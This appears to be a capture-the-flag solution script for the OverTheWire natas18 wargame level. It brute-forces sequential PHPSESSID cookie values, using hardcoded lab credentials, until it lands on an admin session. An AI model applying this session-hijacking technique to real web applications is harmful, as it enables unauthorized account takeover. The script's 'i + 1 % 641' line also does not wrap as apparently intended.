import requests
base_url ="http://natas18.natas.labs.overthewire.org/index.php?username=admin&password=admin&debug"
auth_headers = {'Authorization': 'Basic bmF0YXMxODp4dktJcURqeTRPUHY3d0NSZ0RsbWowcEZzQ3NEamhkUA=='} 
i = 0

while True:
    sessid = i + 1 % 641
    res = requests.get(base_url, auth=("natas18", "8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq"), cookies={'PHPSESSID': f"{sessid}"})
    if("regular" not in res.text):
        print(res.text)
        break
    else:
        i += 1
        print("Attempt:", i,"--- PHPSESSID =", sessid)
